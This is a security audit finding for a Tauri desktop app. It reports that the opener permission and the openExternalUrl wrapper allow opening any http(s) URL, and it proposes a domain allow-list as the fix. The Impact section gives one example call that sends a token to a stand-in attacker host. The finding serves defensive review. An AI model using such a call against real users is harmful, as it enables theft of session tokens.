# DESK-05 — Opener capability permits opening any http(s) URL

- **Severity:** Medium
- **Category:** Tauri Config — Excessive Permission
- **Location:** `apps/desktop/src-tauri/capabilities/default.json:9-11`, `apps/desktop/src/lib/desktop.ts:236-238`

## Description
The capability grants `opener:allow-open-url` plus `opener:allow-default-urls`, which scopes only to `http://*` / `https://*` (scheme, not domain). The frontend `openExternalUrl(url: string)` wrapper calls `openUrl(url)` with no allow-list. All current call sites pass hardcoded constants, but the unrestricted permission means any future call site — or an XSS/prototype-pollution reaching the function — can open arbitrary URLs in the OS browser.

## Impact
An XSS in the desktop webview could call `openExternalUrl('https://attacker.com/steal?token=...')`. Also normalizes app-triggered browser windows, lowering phishing suspicion.

## Evidence
```json
// capabilities/default.json
"opener:allow-open-url",
"opener:allow-default-urls"
```
```typescript
// desktop.ts:236-238
export async function openExternalUrl(url: string): Promise<void> {
  await openUrl(url);  // no domain check
}
```

## Remediation
Replace `opener:allow-default-urls` with an explicit domain allow-list:
```json
{
  "identifier": "opener:allow-open-url",
  "scope": { "allow": [
    {"url": "https://www.filegap.app/**"},
    {"url": "https://github.com/filegap/**"},
    {"url": "https://buymeacoffee.com/filegap/**"}
  ]}
}
```
